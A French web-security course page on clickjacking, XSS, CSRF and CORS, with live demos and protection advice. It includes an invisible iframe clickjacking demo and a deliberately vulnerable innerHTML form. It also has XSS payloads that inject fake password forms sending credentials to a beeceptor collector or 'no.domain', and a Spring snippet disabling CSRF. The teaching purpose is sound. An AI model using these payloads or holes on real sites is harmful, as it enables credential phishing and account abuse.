---
title : "Injections de code (client)"
description: "Les attaques basées sur des croisements de domaines"
lead: ""
draft: false
images: []
weight: 202
---

## Les attaques basées sur des croisements de domaines

Objectifs :
- Un utilisateur connecté sur un site légitime envoie des données à un site attaquant
- Un site attaquant force un utilisateur à faire une opération non souhaité sur le site légitime

### Le clickjacking

Vous avez Gagné<br/>
<button>Cliquez la</button>
<iframe id="t"
    title="t"
    width="1500"
    height="1000"
    style="opacity: 0.00000000001; position: relative;top: -5em; left: -10em;"
    src="http://localhost:8180/admin/master/console/#/realms/test/clients">
</iframe>

Vous avez Gagné, regardez mieux<br/>
<button>Cliquez la</button>
<iframe id="t"
    title="t"
    width="1500"
    height="1000"
    style="opacity: 0.3; position: relative;top: -5em; left: -10em;"
    src="http://localhost:8180/admin/master/console/#/realms/test/clients">
</iframe>


**Les `<iframe>`**
- Principe légitime à la base : afficher une page web sur une autre page web
- Comportements détournés
- Clickjacking = on cache une iframe par dessus un bouton aparemment légitime

```html
<iframe style="opacity: 0" src="https://le-site-des-admins">
```

**XFS Cross Frame Scripting** : principe général d'attaque consistant à injecter le site légitime sur le site du pirate via un iframe

**Attaque INDIRECTE**

=> **Protection PASSIVE**

- on va dire au navigateur que le site n'a aucune raison légitime d'être dans une iframe
  - Des entêtes standards existent :
  ```
  X-Frame-Options:<DENY|SAMEORIGIN|ALLOW-FROM https://example.com/>;
  ```
  - On filtre donc les origines qui ont le droit d'afficher l'iframe
  - /!\ Absence d'entête = autorisé de n'importe quel source



### L'injection de code... côté client !

<script>
		var fonction = function () {
			myUl = document.getElementById("myUl");
			myTxt = document.getElementById("scriptEvil").value;
			var node = document.createElement("LI");
			node.innerHTML = myTxt;
			myUl.appendChild(node);
		}
</script>

>#### École municipale de Kelkepare
>**Inscription d'un nouvel élève**
>
>Prénom : <input id="scriptEvil" type="text" /> <button onClick="fonction()">Inscrire l'élève</button>
>
><ul id="myUl"></ul>


Et si j'écrit dans le formulaire :
```
<form action="https://securite-applicative.free.beeceptor.com" >Entrez votre mot de passe : <input type="password" name="password" /><button type="submit" formtarget="_blank">Me connecter</button></form>
```

Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative

Déclinable à souhait...
```
<button onclick="window.location='https://securite-applicative.free.beeceptor.com'" >Continuer</button>
```

On peut ainsi forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action
- En le redirigeant sur la page avec des paramètres de requete trafiqués
- En stockant en base un code qui va être réaffiché

On peut ainsi rajouter ce genre de code sur la page de l'utilisateur
```html
<script>document.location="https://no.domain"</script>
```
```html
<script>
document.getElementsByTagName("body")[0].innerHTML("
<form action='https://no.domain' >
<br>Connectez vous !<br>
<input type='text' name='email'>
<input type='password' name='mot de passe'>
<input type='submit' value='Connexion'>
</form>
")
</script>
```

On parle de **XSS (Cross-Site Scripting)**

**Pourquoi ?**
- Vol de données, en particulier des cookies de session ([explications](/securite-applicative/digressions.html#/la-session-http))
- Redirection malveillante

**Comment ?**
- Consiste à injecter du code et en particulier des script dans une page web (**donc éxécuté par l'utilisateur dans son navigateur**)
- L'attaquant fournit une requête vers un site légitime mais dont le contenu injecte le code
- L'attaquant peut aussi profiter d'une non validation des données persistantes (BDD)


**Plusieurs types de XSS**
- Injection "en direct" par le serveur, on parle de reflected XSS
- On l'appelle DOM XSS, si elle consiste à modifier le DOM via un script
- Pire, XSS Stored : le pirate arrive à écrire ce code dans une base de données ou dans un fichier local. Il n'a même plus besoin de fournir un lien trafiqué à l'utilisateur.


**Attaque INDIRECTE**
=> **Protection PASSIVE** .. et un peu **ACTIVE**

**Sécurité active :**
- Vérifier les entrées utilisateurs !
- Echapper caractères spéciaux HTML (utiliser au maximum les sécurités internes des framework, sinon des fonctions existent déjà dans les principaux langages, par exemple `${fn:escapeXml(string)}` dans une EL en JSP)

**Sécurité passive :**
- [Résumé des headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
- Content Security Policy (CSP) [Prez](https://developer.mozilla.org/fr/docs/Web/HTTP/CSP)  [Spec](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- (deprecated) [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)

**Compléments pour la protection des cookies**
- Forcer les cookies à être "secure" (utilisable en https uniquement), "httpOnly" (non utilisable dans les scripts)
- Précision : il s'agit de sécurité **déclarative** dont la mise en oeuvre est à la charge du navigateur


## Les attaques CSRF 

CSRF = Cross-Site Request Forgery

- scénario : Le pirate souhaite effectuer une opération en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous êtes authentifié sur le cible cible, l'action s'effectue en votre nom. La vulnérabilité existe sur les authentifications basées sur des cookies ou sur des authentifications sso.


- On ne cherche pas à empécher une acton malveillante en soi
- On cherche à empécher un utilisateur de faire une opération légitime mais forcée par le pirate. On veut s'assurer que l'utilisateur réalise son opération en pleine conscience.

**Protections :**
- Vérifier les entrées utilisateurs ? 
- Ici, l'action à bloquer est légitime...

- Faire en sorte qu'à chaque appel d'un vrai formulaire du site, un jeton à usage unique soit ajouté. Le serveur pourra ainsi s'assurer de la cohérence de la requête
- Des bibliothèques peuvent aider à cette protection : Spring security, pac4j

- Il faut alors ajouter dans chaque formulaire le jeton en hidden
```html
<form action="/monActionAdmin"
  method="post">
  <input type="submit"
    value="Faire l'opération sensible" />
  <input type="hidden"
    name="${_csrf.parameterName}"
    value="${_csrf.token}"/>
</form>
```

- Principe tout POST ne contenant pas ce paramètre se soldera par une 403
- Potentiellement pas nécessaire sur tout le site
- Pour lever la protection en spring security:
```java
http.csrf().ignoringAntMatchers("/saml/**"); // l'ignorer sur certaines url
http.csrf().disable(); // l'ignorer complètement
```


## La protection CORS

CSRF et applis "modernes" :
Frontend JS + Backend Java
- Pas de formulaire côté serveur
- Des requêtes isolée, pas de cookie mais authentification par jeton
- Si je sers "presque" le même service javascript, si l'admin se connecte à mon service, je peux lui faire réaliser toutes les requêtes que je souhaite
- Protection = vérifier l'url où l'admin a récupéré le script

CORS = Cross Over Resource Sharing

Scénario d'attaque :
- J'arrive sur un site pirate, qui déclenche un script récupérant une information sur le site cible, par exemple un site interne inaccessible d'Internet. L'information est ainsi chargée sur la page et la suite du script peut par exemple la renvoyer au pirate.

Contre-attaque :
- Seul le navigateur sait le site réel où il a récupéré le site
- Sur tout navigateur (récent), un script éxécuté par le client et appelant une ressource externe effectuera une vérification CORS
- => La requête ne fonctionnera que si le site externe renvoit un entête Access-Control-Allow-Origin correspond au domaine du site source

*Le site dit : voici l'url des sites qui peuvent m'appeler*

Les navigateurs envoient systématiquement et automatiquement l'entête `Origin` (à moins d'utiliser Netscape 8 ou IE 6)

**Le navigateur n'autorise pas la modification de cet entete par script**

- Pour les requêtes GET et POST "simple", supposées sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requête est directement envoyée mais le résultat ne s'affiche qu'en cas de validation de CORS
- Pour les autres requêtes (avec effets de bord), le navigateur envoie préalablement une requête OPTION, vérifie CORS, et n'exécute la requête qu'en cas de validation
- !!! Les navigateurs vont maintenant plus loin et font la même vérification OPTION pour ces requêtes


- C'est donc le serveur qui a la charge de lire l'entête `Origin`, de répondre ou non selon le contenu
- Le serveur DOIT ajouter l'entete `Access-Control-Allow-Origin`  en cas de succès
- Par défaut un serveur ne va bien sûr rien renvoyer et sera donc impossible à appeler par script
- On peut envisager de renvoyer `Access-Control-Allow-Origin: *` si le site ne fournit que des données publiques non sensibles

Domaine au sens CORS :
- Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port).
- http://localhost:8080 n'est pas le même domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore différent

- Un script lance une requête vers un autre domaine que celui où il est exécuté, typiquement via un XMLHttpRequest().
- Le navigateur ajoute l'entete Origin à la requête
- Cet entête n'est pas modifiable par script

```
Origin: https://localhost:8443
```


- Le serveur recoit la requete et peut contrôler la présence de Origin s'il s'attend à de telles requêtes via script
- Le serveur possède un certain nombre de domaine autorisés à le contacter par script et potentiellement tous (\*)


- Le serveur peut bloquer la requête si elle ne correspond pas à ses domaines autorisés
- Si le serveur choisit de répondre et qu'il est configuré pour, il ajoute un ou plusieurs entêtes Access-Control-Allow-Origin :

```
Access-Control-Allow-Origin: https://localhost:8443
Access-Control-Allow-Origin: http://localhost:8080
```

- S'il accepte n'importe quel requête issue d'un script :

```
Access-Control-Allow-Origin: *
```


- Le navigateur lit la réponse du serveur
- Si elle ne contient pas d'entête Access-Control-Allow-Origin ou qu'aucun entête Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script. *Le script ne fait pas la difference entre un echec de connexion et une erreur cors*


Gestion des erreurs :
- Pour debugger, la console du navigateur vous prévient que la réponse a été bloquée

Test :
```html
<script>
		var testCors = function () {
			var req = new XMLHttpRequest()
			req.open('GET', 'https://insee.fr/fr/accueil', false);
			req.send();
		}
<script>
<button onClick="testCors();">Test CORS KO</button>
```

<script>
		var testCors = function () {
			var req = new XMLHttpRequest()
			req.open('GET', 'https://insee.fr/fr/accueil', false);
			req.send();
		}
</script>
<button onClick="testCors();">Test CORS KO</button>


- Attention à l'autorisation globale (elle peut parfois être nécessaire cependant) : `Access-Control-Allow-Origin: *`
- L'idéal est de controler côté serveur l'entete "Origin" et de personnaliser l'entete "Access-Control-Allow-Origin" si on accepte
- Le détails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS


- Il faut garder à l'esprit que CORS est une sécurité *côté client* pour l'empécher de faire n'importe quoi malgré lui : fournir à un script une information que le serveur n'a pas prévu d'être utilisée par un script.



